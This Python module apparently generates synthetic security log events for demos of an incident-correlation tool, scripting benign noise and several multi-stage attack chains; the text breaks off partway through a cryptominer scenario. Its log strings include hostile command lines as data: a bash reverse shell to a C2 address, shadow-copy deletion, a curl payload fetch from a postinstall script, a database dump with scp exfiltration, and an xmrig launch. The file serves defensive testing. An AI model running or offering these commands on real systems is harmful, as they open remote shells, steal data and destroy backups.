"""Synthetic \"live\" security events for local demos.

Generates normalized :class:`Event` rows with timestamps anchored to \"now\",
so each run looks like a fresh time window. Open source, no external SIEM.
"""
from __future__ import annotations

import random
from datetime import datetime, timedelta, timezone
from typing import List, Optional

from utils.constants import (
    DIRECTION_INBOUND,
    DIRECTION_OUTBOUND,
    EVENT_TYPE_ACCOUNT_MANIPULATION,
    EVENT_TYPE_AUTH_FAILURE,
    EVENT_TYPE_AUTH_SUCCESS,
    EVENT_TYPE_DATA_STAGING,
    EVENT_TYPE_DNS_QUERY,
    EVENT_TYPE_FILE_ACCESS,
    EVENT_TYPE_IDS_ALERT,
    EVENT_TYPE_LATERAL_MOVEMENT,
    EVENT_TYPE_NETWORK_OUTBOUND,
    EVENT_TYPE_NETWORK_SCAN,
    EVENT_TYPE_PRIVILEGE_ESCALATION,
    EVENT_TYPE_PROCESS_EXEC,
    EVENT_TYPE_RANSOMWARE,
    EVENT_TYPE_WEB_ATTACK,
    LOG_SOURCE_DNS,
    LOG_SOURCE_ENDPOINT_EDR,
    LOG_SOURCE_LINUX_AUTH,
    LOG_SOURCE_NETWORK_IDS,
    LOG_SOURCE_WEB_WAF,
    LOG_SOURCE_WINDOWS_AUTH,
    LOG_SOURCE_WINDOWS_SYSMON,
)
from utils.schema import Event


def _utc_now() -> datetime:
    return datetime.now(timezone.utc)


def generate_live_synthetic(
    scenario: str = "multi_stage_attack",
    window_minutes: int = 60,
    noise_events: int = 6,
    seed: Optional[int] = None,
) -> List[Event]:
    """Build synthetic events in the recent past through *now*.

    Args:
        scenario: ``multi_stage_attack`` (brute force → login → outbound + IDS),
            ``demo_reliable_attack`` (strongly-correlated chain for stable demos),
            or ``random_mixed`` (benign-ish noise only).
        window_minutes: Overall span for placement of noise / anchors.
        noise_events: Extra benign events (multi-stage mode only).
        seed: Optional RNG seed for reproducible demos.
    """
    if seed is not None:
        random.seed(seed)

    end = _utc_now()
    start = end - timedelta(minutes=max(window_minutes, 5))

    def between(t0: datetime, t1: datetime) -> datetime:
        span_s = max((t1 - t0).total_seconds(), 1.0)
        return t0 + timedelta(seconds=random.uniform(0, span_s))

    events: List[Event] = []

    if scenario == "random_mixed":
        users = ["alice", "bob", "monitor", "backup"]
        hosts = ["web-01", "db-01", "svc-01"]
        for _ in range(max(noise_events, 3)):
            ts = between(start, end)
            r = random.random()
            if r < 0.35:
                events.append(
                    Event(
                        timestamp=ts,
                        log_source=LOG_SOURCE_LINUX_AUTH,
                        event_type=EVENT_TYPE_AUTH_SUCCESS,
                        raw_log=f"synthetic ssh success user={random.choice(users)}",
                        user=random.choice(users),
                        host=random.choice(hosts),
                        src_ip=f"10.0.0.{random.randint(2, 40)}",
                        action="success",
                        severity="info",
                        tags=["synthetic", "live_demo", "noise"],
                    )
                )
            elif r < 0.6:
                events.append(
                    Event(
                        timestamp=ts,
                        log_source=LOG_SOURCE_NETWORK_IDS,
                        event_type=EVENT_TYPE_NETWORK_OUTBOUND,
                        raw_log="synthetic dns/ntp outbound",
                        src_ip=f"10.0.0.{random.randint(2, 40)}",
                        dst_ip="8.8.8.8",
                        dst_port=53,
                        host=random.choice(hosts),
                        protocol="udp",
                        direction=DIRECTION_OUTBOUND,
                        action="allowed",
                        severity="info",
                        tags=["synthetic", "live_demo", "noise"],
                    )
                )
            else:
                events.append(
                    Event(
                        timestamp=ts,
                        log_source=LOG_SOURCE_LINUX_AUTH,
                        event_type=EVENT_TYPE_AUTH_FAILURE,
                        raw_log="synthetic failed login (orphan noise)",
                        user=random.choice(["nobody", "guest", "test"]),
                        host=random.choice(["legacy", "lab", "old-host"]),
                        src_ip=f"198.51.100.{random.randint(1, 200)}",
                        action="failed",
                        severity="medium",
                        tags=["synthetic", "live_demo", "noise"],
                    )
                )
        events.sort(key=lambda e: (e.timestamp or end, e.event_id))
        return events

    if scenario == "demo_reliable_attack":
        user = random.choice(["admin", "svc_ops"])
        host = random.choice(["linux-web-01", "app-srv-02"])
        src_ip = f"192.168.{random.randint(0, 1)}.{random.randint(40, 220)}"
        dst_ip = f"203.0.113.{random.randint(20, 80)}"

        attack_end = end - timedelta(minutes=random.uniform(1.0, 3.0))
        t0 = attack_end - timedelta(minutes=10)

        # Dense failed auth burst (high-signal).
        for i in range(8):
            ts = t0 + timedelta(seconds=i * 28 + random.randint(0, 8))
            events.append(
                Event(
                    timestamp=ts,
                    log_source=LOG_SOURCE_LINUX_AUTH,
                    event_type=EVENT_TYPE_AUTH_FAILURE,
                    raw_log=f"synthetic reliable failed user={user} host={host} src={src_ip}",
                    user=user,
                    src_ip=src_ip,
                    host=host,
                    action="failed",
                    severity="high",
                    tags=["synthetic", "live_demo", "reliable"],
                )
            )

        ts_ok = t0 + timedelta(minutes=4, seconds=random.randint(8, 40))
        events.append(
            Event(
                timestamp=ts_ok,
                log_source=LOG_SOURCE_LINUX_AUTH,
                event_type=EVENT_TYPE_AUTH_SUCCESS,
                raw_log=f"synthetic reliable success user={user} host={host} src={src_ip}",
                user=user,
                src_ip=src_ip,
                host=host,
                action="success",
                severity="medium",
                tags=["synthetic", "live_demo", "reliable"],
            )
        )

        # Two outbound callbacks + IDS corroboration.
        ts_net1 = ts_ok + timedelta(minutes=2, seconds=random.randint(10, 40))
        ts_net2 = ts_net1 + timedelta(seconds=random.randint(12, 45))
        for ts in (ts_net1, ts_net2):
            events.append(
                Event(
                    timestamp=ts,
                    log_source=LOG_SOURCE_NETWORK_IDS,
                    event_type=EVENT_TYPE_NETWORK_OUTBOUND,
                    raw_log=f"synthetic reliable outbound src={src_ip} dst={dst_ip}:443",
                    src_ip=src_ip,
                    dst_ip=dst_ip,
                    dst_port=443,
                    host=host,
                    protocol="tcp",
                    direction=DIRECTION_OUTBOUND,
                    action="allowed",
                    severity="high",
                    tags=["synthetic", "live_demo", "reliable"],
                )
            )

        ts_ids = ts_net2 + timedelta(seconds=random.randint(3, 12))
        events.append(
            Event(
                timestamp=ts_ids,
                log_source=LOG_SOURCE_NETWORK_IDS,
                event_type=EVENT_TYPE_IDS_ALERT,
                raw_log=f"synthetic reliable ids alert C2-like {src_ip}->{dst_ip}",
                src_ip=src_ip,
                dst_ip=dst_ip,
                dst_port=443,
                host=host,
                alert_name="ET TROJAN Reliable Demo C2 Pattern",
                protocol="tcp",
                direction=DIRECTION_OUTBOUND,
                action="blocked",
                severity="high",
                tags=["synthetic", "live_demo", "ids", "reliable"],
            )
        )

        # Benign background noise (different principals).
        for _ in range(max(noise_events, 4)):
            ts = between(start, t0 - timedelta(minutes=1))
            events.append(
                Event(
                    timestamp=ts,
                    log_source=LOG_SOURCE_LINUX_AUTH,
                    event_type=EVENT_TYPE_AUTH_SUCCESS,
                    raw_log="synthetic reliable noise login",
                    user=random.choice(["deploy", "monitor", "backup"]),
                    host=random.choice(["build-01", "mon-02", "ci-03"]),
                    src_ip=f"10.0.0.{random.randint(2, 30)}",
                    action="success",
                    severity="info",
                    tags=["synthetic", "live_demo", "noise"],
                )
            )
        events.sort(key=lambda e: (e.timestamp or end, e.event_id))
        return events

    # -----------------------------------------------------------------------
    # SCENARIO: bulk_attack_queue
    # 10 True-Positive attack chains + 3 False-Positive benign events,
    # each with completely distinct users / hosts / IPs so the correlator
    # creates 13 separate incidents in one run.
    # -----------------------------------------------------------------------
    if scenario == "bulk_attack_queue":
        evts: List[Event] = []
        attack_end = end - timedelta(minutes=2)

        # ── helper: offset anchor for staggering attacks ────────────────────
        def t_anchor(slot: int, total_slots: int = 13) -> datetime:
            """Return a start time spread evenly across the window."""
            span = (attack_end - start).total_seconds()
            return start + timedelta(seconds=span * slot / total_slots)

        # ════════════════════════════════════════════════════════════════════
        # TP-01  SSH Brute Force → Successful Login → C2 Beacon
        # Actor: attacker 185.220.101.47 → admin on linux-web-01
        # ════════════════════════════════════════════════════════════════════
        t = t_anchor(0)
        u, h, sip, dip = "admin", "linux-web-01", "185.220.101.47", f"203.0.113.{random.randint(10,50)}"
        for i in range(7):
            evts.append(Event(
                timestamp=t + timedelta(seconds=i * 30 + random.randint(0, 8)),
                log_source=LOG_SOURCE_LINUX_AUTH, event_type=EVENT_TYPE_AUTH_FAILURE,
                raw_log=f"sshd: Failed password for {u} from {sip} port {random.randint(30000,60000)} ssh2",
                user=u, src_ip=sip, host=h, action="failed", severity="high",
                tags=["tp01", "brute_force", "ssh"],
            ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=4),
            log_source=LOG_SOURCE_LINUX_AUTH, event_type=EVENT_TYPE_AUTH_SUCCESS,
            raw_log=f"sshd: Accepted password for {u} from {sip} port 22 ssh2",
            user=u, src_ip=sip, host=h, action="success", severity="high",
            tags=["tp01", "brute_force", "ssh"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=6),
            log_source=LOG_SOURCE_NETWORK_IDS, event_type=EVENT_TYPE_NETWORK_OUTBOUND,
            raw_log=f"tcp outbound {sip}->{dip}:4444 ESTABLISHED",
            src_ip=sip, dst_ip=dip, dst_port=4444, host=h, protocol="tcp",
            direction=DIRECTION_OUTBOUND, action="allowed", severity="critical",
            tags=["tp01", "c2"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=7),
            log_source=LOG_SOURCE_NETWORK_IDS, event_type=EVENT_TYPE_IDS_ALERT,
            raw_log=f"ET TROJAN Reverse Shell beacon {sip}->{dip}:4444",
            src_ip=sip, dst_ip=dip, dst_port=4444, host=h, protocol="tcp",
            direction=DIRECTION_OUTBOUND, alert_name="ET TROJAN Reverse Shell Beacon",
            action="alerted", severity="critical", tags=["tp01", "ids", "c2"],
        ))

        # ════════════════════════════════════════════════════════════════════
        # TP-02  Ransomware Chain: Phishing → Cred Dump → Lateral → Encrypt
        # Actor: jsmith on WIN-FIN-01
        # ════════════════════════════════════════════════════════════════════
        t = t_anchor(1)
        u, h, h2 = "jsmith", "WIN-FIN-01", "FS-FINANCE-02"
        sip, c2 = f"91.92.{random.randint(100,200)}.{random.randint(1,200)}", f"77.91.{random.randint(50,150)}.5"
        evts.append(Event(
            timestamp=t, log_source=LOG_SOURCE_WEB_WAF, event_type=EVENT_TYPE_WEB_ATTACK,
            raw_log=f"WAF ALLOW inbound phishing link clicked user={u} host={h} src={sip}",
            src_ip=sip, host=h, action="allowed", severity="medium",
            tags=["tp02", "ransomware", "phishing"],
        ))
        for i in range(5):
            evts.append(Event(
                timestamp=t + timedelta(seconds=60 + i * 30),
                log_source=LOG_SOURCE_WINDOWS_AUTH, event_type=EVENT_TYPE_AUTH_FAILURE,
                raw_log=f"Logon failure user={u} from {sip} host={h}",
                user=u, src_ip=sip, host=h, action="failed", severity="high",
                tags=["tp02", "ransomware", "credential_access"],
            ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=4),
            log_source=LOG_SOURCE_WINDOWS_SYSMON, event_type=EVENT_TYPE_PROCESS_EXEC,
            raw_log=f"lsass.exe accessed by svhost32.exe host={h} user={u} (credential dump)",
            user=u, host=h, action="executed", severity="critical",
            tags=["tp02", "ransomware", "credential_dump", "lsass"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=6),
            log_source=LOG_SOURCE_WINDOWS_AUTH, event_type=EVENT_TYPE_AUTH_SUCCESS,
            raw_log=f"Logon success ADMINISTRATOR from {sip} host={h2} (lateral smb)",
            user="ADMINISTRATOR", src_ip=sip, host=h2, action="success", severity="critical",
            tags=["tp02", "ransomware", "lateral_movement"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=8),
            log_source=LOG_SOURCE_WINDOWS_SYSMON, event_type=EVENT_TYPE_PROCESS_EXEC,
            raw_log=f"vssadmin.exe delete shadows /all /quiet host={h2} user=SYSTEM",
            user="SYSTEM", host=h2, action="executed", severity="critical",
            tags=["tp02", "ransomware", "inhibit_recovery"],
        ))
        for i in range(4):
            evts.append(Event(
                timestamp=t + timedelta(minutes=9, seconds=i * 20),
                log_source=LOG_SOURCE_ENDPOINT_EDR, event_type=EVENT_TYPE_RANSOMWARE,
                raw_log=f"Mass file rename .locked detected host={h2} files={100+i*50} user=SYSTEM",
                user="SYSTEM", host=h2, action="encrypt", severity="critical",
                tags=["tp02", "ransomware", "impact"],
            ))

        # ════════════════════════════════════════════════════════════════════
        # TP-03  Insider Threat: After-Hours File Harvest → Cloud Exfil
        # Actor: d.jones on CORP-LT-07
        # ════════════════════════════════════════════════════════════════════
        t = t_anchor(2)
        u, h = "d.jones", "CORP-LT-07"
        sip, cloud_ip = f"10.10.3.{random.randint(20,80)}", "185.159.82.14"
        evts.append(Event(
            timestamp=t, log_source=LOG_SOURCE_WINDOWS_AUTH, event_type=EVENT_TYPE_AUTH_SUCCESS,
            raw_log=f"Logon success user={u} host={h} time=02:47 outside_business_hours=True",
            user=u, src_ip=sip, host=h, action="success", severity="medium",
            tags=["tp03", "insider_threat", "after_hours"],
        ))
        for fname in ["HR_Salaries.xlsx", "M&A_Targets.docx", "IP_Roadmap.pdf", "Exec_Comp.xlsx"]:
            evts.append(Event(
                timestamp=t + timedelta(minutes=random.randint(2, 8)),
                log_source=LOG_SOURCE_WINDOWS_SYSMON, event_type=EVENT_TYPE_FILE_ACCESS,
                raw_log=f"File read \\\\FS-HR\\Confidential\\{fname} user={u} size={random.randint(200,900)}KB",
                user=u, host=h, src_ip=sip, action="read", severity="high",
                tags=["tp03", "insider_threat", "file_access", "sensitive"],
            ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=10),
            log_source=LOG_SOURCE_WINDOWS_SYSMON, event_type=EVENT_TYPE_DATA_STAGING,
            raw_log=f"7z.exe a C:\\Temp\\archive.zip C:\\Temp\\collect user={u} host={h}",
            user=u, host=h, src_ip=sip, action="executed", severity="high",
            tags=["tp03", "insider_threat", "data_staging"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=12),
            log_source=LOG_SOURCE_NETWORK_IDS, event_type=EVENT_TYPE_NETWORK_OUTBOUND,
            raw_log=f"Large HTTPS upload {sip}->{cloud_ip}:443 bytes=142MB host={h}",
            src_ip=sip, dst_ip=cloud_ip, dst_port=443, host=h, protocol="tcp",
            direction=DIRECTION_OUTBOUND, action="allowed", severity="high",
            tags=["tp03", "insider_threat", "exfiltration"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=13),
            log_source=LOG_SOURCE_NETWORK_IDS, event_type=EVENT_TYPE_IDS_ALERT,
            raw_log=f"ET POLICY Anomalous large upload to mega.nz src={sip} dst={cloud_ip}",
            src_ip=sip, dst_ip=cloud_ip, dst_port=443, host=h,
            alert_name="ET POLICY Large Upload to Cloud Storage", action="alerted", severity="high",
            tags=["tp03", "insider_threat", "ids"],
        ))

        # ════════════════════════════════════════════════════════════════════
        # TP-04  Web RCE → Reverse Shell → Internal Scan → Lateral Movement
        # Actor: attacker 45.142.212.100 → api-gateway-01
        # ════════════════════════════════════════════════════════════════════
        t = t_anchor(3)
        h, sip, c2 = "api-gateway-01", "45.142.212.100", f"194.165.{random.randint(16,50)}.22"
        internal = "10.20.1.15"
        for path in ["/.env", "/wp-admin/", "/../etc/passwd"]:
            evts.append(Event(
                timestamp=t + timedelta(seconds=random.randint(0, 40)),
                log_source=LOG_SOURCE_WEB_WAF, event_type=EVENT_TYPE_WEB_ATTACK,
                raw_log=f"WAF BLOCK path_traversal GET {path} src={sip} host={h}",
                src_ip=sip, host=h, dst_port=443, action="blocked", severity="medium",
                tags=["tp04", "web_rce", "recon"],
            ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=3),
            log_source=LOG_SOURCE_WEB_WAF, event_type=EVENT_TYPE_WEB_ATTACK,
            raw_log=f"WAF ALLOW POST /upload?file=shell.php.jpg src={sip} host={h} status=200",
            src_ip=sip, host=h, dst_port=443, action="allowed", severity="critical",
            alert_name="WAF-RCE-007: Suspicious File Upload Double Extension",
            tags=["tp04", "web_rce", "file_upload"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=4),
            log_source=LOG_SOURCE_ENDPOINT_EDR, event_type=EVENT_TYPE_PROCESS_EXEC,
            raw_log=f"nginx→bash reverse shell spawned host={h} cmd='bash -i >& /dev/tcp/{c2}/4444 0>&1'",
            user="www-data", host=h, src_ip=internal, action="executed", severity="critical",
            tags=["tp04", "web_rce", "reverse_shell"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=5),
            log_source=LOG_SOURCE_NETWORK_IDS, event_type=EVENT_TYPE_NETWORK_OUTBOUND,
            raw_log=f"tcp {internal}->{c2}:4444 ESTABLISHED host={h}",
            src_ip=internal, dst_ip=c2, dst_port=4444, host=h, protocol="tcp",
            direction=DIRECTION_OUTBOUND, action="allowed", severity="critical",
            tags=["tp04", "web_rce", "c2"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=6),
            log_source=LOG_SOURCE_NETWORK_IDS, event_type=EVENT_TYPE_IDS_ALERT,
            raw_log=f"ET TROJAN Reverse Shell C2 beacon {internal}->{c2}:4444",
            src_ip=internal, dst_ip=c2, dst_port=4444, host=h,
            alert_name="ET TROJAN Reverse Shell Beacon Detected",
            action="alerted", severity="critical", tags=["tp04", "web_rce", "ids"],
        ))

        # ════════════════════════════════════════════════════════════════════
        # TP-05  Credential Stuffing → ATO → New Backdoor Admin Account
        # Actor: attacker 104.248.50.100 → sarah.hayes on DC-MAIN-01
        # ════════════════════════════════════════════════════════════════════
        t = t_anchor(4)
        u, h = "sarah.hayes", "DC-MAIN-01"
        sip, internal = "104.248.50.100", f"10.0.1.{random.randint(10,50)}"
        for acct in ["john.doe", "alice.k", "bob.w", u, "ops.svc", "it.admin"]:
            for _ in range(2):
                evts.append(Event(
                    timestamp=t + timedelta(seconds=random.randint(0, 180)),
                    log_source=LOG_SOURCE_WINDOWS_AUTH, event_type=EVENT_TYPE_AUTH_FAILURE,
                    raw_log=f"Logon failure user={acct} src={sip} host={h} reason=bad_password",
                    user=acct, src_ip=sip, host=h, action="failed", severity="medium",
                    tags=["tp05", "credential_stuffing"],
                ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=4),
            log_source=LOG_SOURCE_WINDOWS_AUTH, event_type=EVENT_TYPE_AUTH_SUCCESS,
            raw_log=f"Logon success user={u} src={sip} host={h} logon_type=3",
            user=u, src_ip=sip, host=h, action="success", severity="critical",
            tags=["tp05", "credential_stuffing", "account_takeover"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=6),
            log_source=LOG_SOURCE_WINDOWS_SYSMON, event_type=EVENT_TYPE_PRIVILEGE_ESCALATION,
            raw_log=f"powershell.exe -ExecutionPolicy Bypass elevated=True user={u} host={h}",
            user=u, host=h, src_ip=internal, action="executed", severity="high",
            tags=["tp05", "credential_stuffing", "privilege_escalation"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=8),
            log_source=LOG_SOURCE_WINDOWS_AUTH, event_type=EVENT_TYPE_ACCOUNT_MANIPULATION,
            raw_log=f"EventID=4720 New account created: svc.backdoor99 by={u} host={h}",
            user=u, host=h, src_ip=internal, action="create_account", severity="critical",
            tags=["tp05", "credential_stuffing", "persistence", "backdoor"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=9),
            log_source=LOG_SOURCE_WINDOWS_AUTH, event_type=EVENT_TYPE_ACCOUNT_MANIPULATION,
            raw_log=f"EventID=4728 svc.backdoor99 added to Domain Admins by={u} host={h}",
            user=u, host=h, src_ip=internal, action="group_add", severity="critical",
            tags=["tp05", "credential_stuffing", "persistence", "domain_admins"],
        ))

        # ════════════════════════════════════════════════════════════════════
        # TP-06  Password Spray → Privilege Escalation → Scheduled Task
        # Actor: attacker 91.92.200.100 → svc_ops on APP-SRV-03
        # ════════════════════════════════════════════════════════════════════
        t = t_anchor(5)
        u, h = "svc_ops", "APP-SRV-03"
        sip = "91.92.200.100"
        for i in range(8):
            evts.append(Event(
                timestamp=t + timedelta(seconds=i * 45 + random.randint(0, 10)),
                log_source=LOG_SOURCE_LINUX_AUTH, event_type=EVENT_TYPE_AUTH_FAILURE,
                raw_log=f"sshd: Failed password for {u} from {sip} port {22000+i}",
                user=u, src_ip=sip, host=h, action="failed", severity="high",
                tags=["tp06", "password_spray"],
            ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=7),
            log_source=LOG_SOURCE_LINUX_AUTH, event_type=EVENT_TYPE_AUTH_SUCCESS,
            raw_log=f"sshd: Accepted publickey for {u} from {sip} port 22",
            user=u, src_ip=sip, host=h, action="success", severity="high",
            tags=["tp06", "password_spray", "valid_accounts"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=9),
            log_source=LOG_SOURCE_ENDPOINT_EDR, event_type=EVENT_TYPE_PRIVILEGE_ESCALATION,
            raw_log=f"sudo -l then sudo su executed user={u} host={h} → root shell obtained",
            user=u, host=h, src_ip=sip, action="executed", severity="critical",
            tags=["tp06", "password_spray", "privilege_escalation"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=11),
            log_source=LOG_SOURCE_WINDOWS_SYSMON, event_type=EVENT_TYPE_PROCESS_EXEC,
            raw_log=f"crontab -e backdoor entry added host={h} user=root (persistence)",
            user="root", host=h, src_ip=sip, action="executed", severity="critical",
            tags=["tp06", "password_spray", "persistence"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=12),
            log_source=LOG_SOURCE_NETWORK_IDS, event_type=EVENT_TYPE_NETWORK_OUTBOUND,
            raw_log=f"tcp {sip}->203.0.113.99:9001 ESTABLISHED host={h} (C2)",
            src_ip=sip, dst_ip="203.0.113.99", dst_port=9001, host=h,
            protocol="tcp", direction=DIRECTION_OUTBOUND, action="allowed", severity="critical",
            tags=["tp06", "password_spray", "c2"],
        ))

        # ════════════════════════════════════════════════════════════════════
        # TP-07  Phishing Email → Macro → Lateral Movement → Domain Escalation
        # Actor: a.kumar on WIN-HR-05 → DC-BACKUP-01
        # ════════════════════════════════════════════════════════════════════
        t = t_anchor(6)
        u, h, h2 = "a.kumar", "WIN-HR-05", "DC-BACKUP-01"
        sip = f"10.10.2.{random.randint(5, 50)}"
        attacker = f"185.220.{random.randint(150,200)}.{random.randint(1,200)}"
        evts.append(Event(
            timestamp=t, log_source=LOG_SOURCE_WINDOWS_SYSMON, event_type=EVENT_TYPE_PROCESS_EXEC,
            raw_log=f"WINWORD.EXE spawned powershell.exe host={h} user={u} (macro execution)",
            user=u, host=h, src_ip=sip, action="executed", severity="high",
            tags=["tp07", "phishing", "macro"],
        ))
        for i in range(4):
            evts.append(Event(
                timestamp=t + timedelta(seconds=60 + i * 25),
                log_source=LOG_SOURCE_WINDOWS_AUTH, event_type=EVENT_TYPE_AUTH_FAILURE,
                raw_log=f"Logon failure user={u} src={sip} host={h2} logon_type=3",
                user=u, src_ip=sip, host=h2, action="failed", severity="high",
                tags=["tp07", "phishing", "lateral_movement"],
            ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=5),
            log_source=LOG_SOURCE_WINDOWS_AUTH, event_type=EVENT_TYPE_AUTH_SUCCESS,
            raw_log=f"Logon success user={u} src={sip} host={h2} logon_type=3",
            user=u, src_ip=sip, host=h2, action="success", severity="critical",
            tags=["tp07", "phishing", "lateral_movement"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=7),
            log_source=LOG_SOURCE_WINDOWS_AUTH, event_type=EVENT_TYPE_ACCOUNT_MANIPULATION,
            raw_log=f"EventID=4728 {u} added to Enterprise Admins group host={h2}",
            user=u, host=h2, src_ip=sip, action="group_add", severity="critical",
            tags=["tp07", "phishing", "domain_escalation"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=9),
            log_source=LOG_SOURCE_NETWORK_IDS, event_type=EVENT_TYPE_NETWORK_OUTBOUND,
            raw_log=f"tcp {sip}->{attacker}:443 C2 beacon host={h2}",
            src_ip=sip, dst_ip=attacker, dst_port=443, host=h2,
            protocol="tcp", direction=DIRECTION_OUTBOUND, action="allowed", severity="critical",
            tags=["tp07", "phishing", "c2"],
        ))

        # ════════════════════════════════════════════════════════════════════
        # TP-08  Database Exfiltration via SQL Dump + Large Transfer
        # Actor: db_admin on DB-PROD-01
        # ════════════════════════════════════════════════════════════════════
        t = t_anchor(7)
        u, h = "db_admin", "DB-PROD-01"
        sip, dst = f"10.30.1.{random.randint(5,40)}", f"198.51.100.{random.randint(50,200)}"
        evts.append(Event(
            timestamp=t, log_source=LOG_SOURCE_LINUX_AUTH, event_type=EVENT_TYPE_AUTH_SUCCESS,
            raw_log=f"sshd: Accepted password for {u} from {sip} port 22 (unusual source)",
            user=u, src_ip=sip, host=h, action="success", severity="medium",
            tags=["tp08", "db_exfil", "unusual_access"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=2),
            log_source=LOG_SOURCE_ENDPOINT_EDR, event_type=EVENT_TYPE_PROCESS_EXEC,
            raw_log=f"mysqldump --all-databases > /tmp/full_dump.sql user={u} host={h}",
            user=u, host=h, src_ip=sip, action="executed", severity="high",
            tags=["tp08", "db_exfil", "data_staging"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=4),
            log_source=LOG_SOURCE_WINDOWS_SYSMON, event_type=EVENT_TYPE_DATA_STAGING,
            raw_log=f"gzip /tmp/full_dump.sql → full_dump.sql.gz (1.2GB) host={h} user={u}",
            user=u, host=h, src_ip=sip, action="executed", severity="high",
            tags=["tp08", "db_exfil", "data_staging"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=6),
            log_source=LOG_SOURCE_NETWORK_IDS, event_type=EVENT_TYPE_NETWORK_OUTBOUND,
            raw_log=f"scp {sip}->{dst}:22 bytes_out=1.2GB host={h} (suspicious large scp)",
            src_ip=sip, dst_ip=dst, dst_port=22, host=h, protocol="tcp",
            direction=DIRECTION_OUTBOUND, action="allowed", severity="high",
            tags=["tp08", "db_exfil", "exfiltration"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=7),
            log_source=LOG_SOURCE_NETWORK_IDS, event_type=EVENT_TYPE_IDS_ALERT,
            raw_log=f"ET POLICY Anomalous large SCP transfer {sip}->{dst}",
            src_ip=sip, dst_ip=dst, dst_port=22, host=h,
            alert_name="ET POLICY Anomalous Large SCP Exfil", action="alerted", severity="high",
            tags=["tp08", "db_exfil", "ids"],
        ))

        # ════════════════════════════════════════════════════════════════════
        # TP-09  Supply Chain: Build Server C2 Beacon (Compromised Package)
        # Actor: CI pipeline on BUILD-SRV-01
        # ════════════════════════════════════════════════════════════════════
        t = t_anchor(8)
        h, sip = "BUILD-SRV-01", f"10.50.1.{random.randint(5,30)}"
        c2 = f"45.33.{random.randint(30,200)}.{random.randint(1,200)}"
        evts.append(Event(
            timestamp=t, log_source=LOG_SOURCE_ENDPOINT_EDR, event_type=EVENT_TYPE_PROCESS_EXEC,
            raw_log=f"npm install triggered postinstall script executing curl {c2}/payload.sh host={h}",
            user="ci-runner", host=h, src_ip=sip, action="executed", severity="high",
            tags=["tp09", "supply_chain", "malicious_package"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=1),
            log_source=LOG_SOURCE_NETWORK_IDS, event_type=EVENT_TYPE_NETWORK_OUTBOUND,
            raw_log=f"curl {sip}->{c2}:443 fetching payload.sh host={h}",
            src_ip=sip, dst_ip=c2, dst_port=443, host=h, protocol="tcp",
            direction=DIRECTION_OUTBOUND, action="allowed", severity="high",
            tags=["tp09", "supply_chain", "c2"],
        ))
        for i in range(3):
            evts.append(Event(
                timestamp=t + timedelta(minutes=3, seconds=i * 60),
                log_source=LOG_SOURCE_NETWORK_IDS, event_type=EVENT_TYPE_NETWORK_OUTBOUND,
                raw_log=f"C2 beacon interval {sip}->{c2}:443 bytes=512 host={h}",
                src_ip=sip, dst_ip=c2, dst_port=443, host=h, protocol="tcp",
                direction=DIRECTION_OUTBOUND, action="allowed", severity="critical",
                tags=["tp09", "supply_chain", "c2", "beacon"],
            ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=7),
            log_source=LOG_SOURCE_NETWORK_IDS, event_type=EVENT_TYPE_IDS_ALERT,
            raw_log=f"ET TROJAN Periodic C2 Beacon Pattern {sip}->{c2}:443 host={h}",
            src_ip=sip, dst_ip=c2, dst_port=443, host=h,
            alert_name="ET TROJAN Periodic C2 Beacon", action="alerted", severity="critical",
            tags=["tp09", "supply_chain", "ids"],
        ))

        # ════════════════════════════════════════════════════════════════════
        # TP-10  Cryptominer: Brute Force → Miner Deployed on Dev Server
        # Actor: attacker 193.32.162.20 → linux-dev-033
        # ════════════════════════════════════════════════════════════════════
        t = t_anchor(9)
        u, h = "ubuntu", "linux-dev-033"
        sip, miner_pool = "193.32.162.20", "pool.minexmr.com"
        for i in range(6):
            evts.append(Event(
                timestamp=t + timedelta(seconds=i * 40 + random.randint(0, 10)),
                log_source=LOG_SOURCE_LINUX_AUTH, event_type=EVENT_TYPE_AUTH_FAILURE,
                raw_log=f"sshd: Failed password for {u} from {sip} port {20000+i}",
                user=u, src_ip=sip, host=h, action="failed", severity="high",
                tags=["tp10", "cryptominer", "brute_force"],
            ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=5),
            log_source=LOG_SOURCE_LINUX_AUTH, event_type=EVENT_TYPE_AUTH_SUCCESS,
            raw_log=f"sshd: Accepted password for {u} from {sip} port 22",
            user=u, src_ip=sip, host=h, action="success", severity="high",
            tags=["tp10", "cryptominer", "valid_accounts"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=6),
            log_source=LOG_SOURCE_ENDPOINT_EDR, event_type=EVENT_TYPE_PROCESS_EXEC,
            raw_log=f"xmrig --pool {miner_pool}:3333 --user WALLET123 spawned host={h} user={u}",
            user=u, host=h, src_ip=sip, action="executed", severity="critical",
            tags=["tp10", "cryptominer", "process_exec"],
        ))
        evts.append(Event(
            timestamp=t + timedelta(minutes=7),
